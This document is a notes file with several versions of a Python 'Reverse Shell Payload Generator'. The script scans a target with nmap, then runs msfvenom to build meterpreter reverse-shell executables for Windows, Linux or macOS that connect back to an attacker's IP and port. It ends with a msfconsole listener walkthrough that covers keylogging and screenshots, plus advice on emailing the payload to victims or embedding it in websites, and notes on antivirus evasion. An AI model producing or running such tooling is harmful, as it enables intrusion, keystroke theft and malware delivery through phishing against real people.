I DONT THINK THIS IS THE RIGHT ONE -----> THE SECOND ONE IS A BETTER ONE ...STARTS AT LINE 28....Observe our progress from start to finish.
def msfvenomWrapper():
    # Get payload type
    payload_type = input("Please specify payload type (e.g. windows/meterpreter/bind_tcp): ")

    # Get target system
    target_system = input("Please specify target system (e.g. Windows, Linux): ")

    # Get target architecture
    target_arch = input("Please specify target architecture (e.g. x86, x64): ")

    # Get target IP
    target_ip = input("Please specify target IP: ")

    # Get target port
    target_port = input("Please specify target port: ")

    # Generate payload
    generated_payload = f'msfvenom -p {payload_type} -a {target_arch} -o {target_system} LHOST={target_ip} LPORT={target_port}'

    # Output payload
    print(generated_payload)

msfvenomWrapper()
------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------
THIS SHOULD BE A BETTER ONE....THIS ONE RAN PROPERLY IN VISUAL STUDIO
#!/usr/bin/python

import os
import subprocess

print("Welcome to the Reverse Shell Payload Generator")
filename = input("Please enter the name of the file you want for payload: ")

# Get info from user
attackerIP = input("Please enter the IP of the attacker machine: ")
attackerPort = input("Please enter the port of the attacker machine: ")


# Enumerate target
targetIP = input("Please enter the IP of the target machine: ")
osInfo = str(subprocess.check_output(["nmap", "-O", targetIP]))
print(type(osInfo))
print(osInfo)

if osInfo.find("windows") != -1:
    #print("i found windows")
    os = "windows"
    print(os)
elif osInfo.find("linux") != -1:
    os = "linux"
    print(os)
elif osInfo.find("solarlis") !=-1:
    os = "solaris"
    print(os)

payload = "msfvenom -p "+os+"/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f raw"      
print(payload)
payload = filename
print(payload) ---did not work

--------------------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------------------

#!/usr/bin/python
 
import os
import subprocess
 
print("Welcome to the Reverse Shell Payload Generator")
 
filename = input("Please enter desired filename: ")
# Get info from user
attackerIP = input("Please enter the IP of the attacker machine: ")
attackerPort = input("Please enter the port of the attacker machine: ")
 
# Enumerate target
targetIP = input("Please enter the IP of the target machine: ")
osInfo = str(subprocess.check_output(["nmap", "-O", targetIP]))
print(type(osInfo))
print(osInfo)
 
os = ""
 
if osInfo.find("windows") != -1:
    print("Windows Found")
    os = "windows"
    print(os)
elif osInfo.find("linux") != -1:
    os = "linux"
    print(os)

 
if os == "":
    print("[*] Unable to profile OS, defaulting to Windows.")
    os = "windows"
 
#payload = ("msfvenom -p "+os+"/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f exe -o " + filename)
#print("[*] Exporting payload, please be patient as: " + filename)
#subprocess.Popen(payload, shell=True).wait()
#print("[*] Exported payload successfully.")

payload = ("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f exe -o"+ filename)
print("[*] Exporting payload, please be patient as: " + filename)
subprocess.Popen(payload, shell=True).wait()
print("[*] Exported payload successfully.")

------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
===================================================================================================================================================================
==================================================================================================================================================================
=====================================================================================================================================================================
#### REFERENCE SITE ---> https://medium.com/@nmappn/msfvenom-payload-list-77261100a55b
##### reference site for commands --> https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
####THIS ONE SEEMS TO WORK FOR ME ...AT LEAST WHEN I SET WINDOWS AS A TARGET...I HAVE NOT TRIED IT ON LINUX AS A TARGET ---> STILL NEED TO TEST IT ON LINUX VS LINUX

#!/usr/bin/python

import os
import subprocess

print("Welcome to the Reverse Shell Payload Generator")
filename = input("Please enter the name you want for the file: ")
# Get info from user
attackerIP = input("Please enter the IP of the attacker machine: ")
attackerPort = input("Please enter the port of the attacker machine: ")

# Enumerate target
targetIP = input("Please enter the IP of the target machine: ")
osInfo = str(subprocess.check_output(["nmap", "-O", targetIP]))
print(type(osInfo))
print(osInfo)

os = ""
payload = ""

if osInfo.find("windows") != -1:
    #print("i found windows")
    os = "windows"
    print(os)
    payload = ("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f exe -o"+ filename)

elif osInfo.find("linux") != -1:
    os = "linux"
    print(os)
    payload = ("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f elf -o"+ filename)

if os == "":
    print("[*] Unable to profile OS, defaulting to Windows.")
    os = "windows"
    payload = ("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f exe -o"+ filename)



print("[*] Exporting payload, please be patient as: " + filename)
subprocess.Popen(payload, shell=True).wait()
print("[*] Exported payload successfully.")


====================================================================================================================================================================
===================================================================================================================================================================
====================================================================================================================================================================
### WITH MAC OS ADDED ON !! 

#!/usr/bin/python

import os
import subprocess

print("Welcome to the Reverse Shell Payload Generator")
filename = input("Please enter the name you want for the file: ")
# Get info from user
attackerIP = input("Please enter the IP of the attacker machine(IPv4 format): ")
attackerPort = input("Please enter the port of the attacker machine(1 - 65535): ")

# Enumerate target
targetIP = input("Please enter the IP of the target machine: ")
osInfo = str(subprocess.check_output(["nmap", "-O", targetIP]))
print(type(osInfo))
print(osInfo)

os = ""
payload = ""

if osInfo.find("windows") != -1:
    #print("i found windows")
    os = "windows"
    print(os)
    payload = ("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f exe -o"+ filename+".exe")

elif osInfo.find("linux") != -1:
    os = "linux"
    print(os)
    payload = ("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f elf -o"+ filename)


elif osInfo.find("osx") != -1:
    os = "osx"
    print(os)
    payload = ("msfvenom -p osx/x86/shell_reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f macho -o"+ filename)

if os == "":
    print("[*] Unable to profile OS, defaulting to Windows.")
    os = "windows"
    payload = ("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f exe -o"+ filename)



print("[*] Exporting payload, please be patient as: " + filename)
subprocess.Popen(payload, shell=True).wait()
print("[*] Exported payload successfully.")

======================================================================================================================================================================
======================================================================================================================================================================
======================================================================================================================================================================

#!/usr/bin/python
#importing the os and subprocess module allows us to not only create new files but to also start new applications within the python scritp.
import os
import subprocess

from colorama import Fore, Back, Style
#colorama is a python module that allows us to change the color of the text. PURELY AESTHETIC
print(Fore.RED + Back.BLACK)

print("Welcome to the Reverse Shell Payload Generator")

print(Fore.WHITE)

filename = input("Please enter the name you want for the file: ")

# Here we are entering the Attack IP, Attack Port, whether or not we want to use meterpreter as well as if we want the payload to be staged or stageless.
print(Fore.CYAN)

attackerIP = input("Please enter your IP address: " + "\n")
attackerPort = input("Enter a port number (1 - 65,535): " +"\n")
meterpreter = input("Would you like to use meterpreter? (y/n): " + "\n")
stageless = input("Do you want the payload to be stageless? (y/n): " + "\n")

# Enumerate target

print(Fore.RED)
#Here we are adding the target information/runs a nmap scan to find the OS of the target.
targetIP = input("Please enter the IP of the target machine: ")
print(Fore.WHITE)
osInfo = str(subprocess.check_output(["nmap", "-O", targetIP]))
print(type(osInfo))
print(osInfo)

os = ""
payload = ""
#Here we are using if/elif statements to generate the payload depending on what OS was found in the nmap scan.
#We have statements for Windows, linux and Mac. For this example we used our windows machine so the code will output a windows payload.
if osInfo.find("windows") != -1:
    print(Fore.GREEN)
    os = "windows"
    payload = ("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f exe -o"+ filename+".exe")

elif osInfo.find("linux") != -1:
    print(Fore.MAGENTA)
    os = "linux"
    payload = ("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f elf -o"+ filename)

elif osInfo.find("osx") != -1:
    print(Fore.BLUE)
    os = "osx"
    payload = ("msfvenom -p osx/x86/shell_reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f macho -o"+ filename)

elif os == "":
    print(Fore.GREEN + "[*] Unable to profile OS, defaulting to Windows.")
    os = "windows"
    payload = ("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f exe -o"+ filename+".exe")


#Here we are exporting the payload into the file with the name we previously created.
print(Fore.GREEN + "[*] Exporting payload, please be patient as: " + filename)
subprocess.Popen(payload, shell=True).wait()
print("[*] Exported payload successfully.")


====================================================================================================================================================================
====================================================================================================================================================================
====================================================================================================================================================================
##copy the code into a file ie. nano dad.py, and dont forget to chmod to make it executable chmod +x dad.py. Now that dad.py is executable , sudo ./dad.py to run it and it will prompt you to the questions
## then it will Nmap scan our target, (I would say this technique is better for spear-phishing since you need to know target ip address to be able to create the payload successful.) and then give you an executable payload
## you can put that into a file , attach to a link then email it to your target and hoping they click on it , or if you wanna embed into a website, you can do so.

#!/usr/bin/python

import os
import subprocess

from colorama import Fore, Back, Style

print(Fore.RED + Back.BLACK)

print("Welcome to the Reverse Shell Payload Generator")

print(Fore.WHITE)

filename = input("Please enter the name you want for the file: ")

# Get info from user

print(Fore.CYAN)

attackerIP = input("Please enter your IP address: " + "\n")

attackerPort = input("Enter a port number (1 - 65,535): " +"\n")

meterpreter = input("Would you like to use meterpreter? (y/n): " + "\n")

stageless = input("Do you want the payload to be stageless? (y/n): " + "\n")

# Enumerate target

print(Fore.RED)

targetIP = input("Please enter the IP of the target machine: ")
print(Fore.WHITE)
osInfo = str(subprocess.check_output(["nmap", "-O", targetIP]))
print(type(osInfo))
print(osInfo)

os = ""
payload = ""

if osInfo.find("windows") != -1:
    print(Fore.GREEN)
    os = "windows"
    payload = ("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f exe -o"+ filename+".exe")

elif osInfo.find("linux") != -1:
    print(Fore.MAGENTA)
    os = "linux"
    payload = ("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f elf -o"+ filename)

elif osInfo.find("osx") != -1:
    print(Fore.BLUE)
    os = "osx"
    payload = ("msfvenom -p osx/x86/shell_reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f macho -o"+ filename)

elif os == "":
    print(Fore.GREEN + "[*] Unable to profile OS, defaulting to Windows.")
    os = "windows"
    payload = ("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f exe -o"+ filename+".exe")



print(Fore.GREEN + "[*] Exporting payload, please be patient as: " + filename)
subprocess.Popen(payload, shell=True).wait()
print("[*] Exported payload successfully.")

>>> EXAMPLE ON How to set up a listener to capture the connection from the target............ in this example our target is Windows OS.
In KALI , Open a terminal to start a listener and wait for reverse shell connection
in terminal type in msfconsole as a command, then  
msf6> use multi/handler
msf6 exploit(multi/handler)> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler)> show option ## to see what we need to fill out
msf6 exploit(multi/handler)> set LHOST xx.xx.xx.xx 
msf6 exploit(multi/handler)> set LPORT xxxxx
msf6 exploit(multi/handler)> run
## now we should have Windows machine connected back to us ##
 ##the prompt will change to meterpreter## 
meterpreter> shell ### it will look like we are in Windows , we can capture key stroke, take screenshot or even turn off the Windows OS by using the command "shutdown" , type in help to see more options.
meterpreter> help ## to see more options
meterpreter> keyscan_start
meterpreter> keyscan_stop
meterpreter> screenshot ### and much more 

 
##NOTE: Meterpreter is a Metaspliiot attack payload that provides an interactive shell to the attacker so they can explore the target machine and execute code.
        Meterpreter completely resides in the memory of the compromised system and write nothing to the disk (to try to avoid detection by a av). 
        It doesn't spawn any new process(to also try to avoid av detection) but instead inject(DLL injection) itself into the compromised process.
        It has an ability to migrate to other running processes easily.
        By default, Meterpreter communicates over encrypted channel, which leaves a limited trace on the compromised system from a forensic perspective.


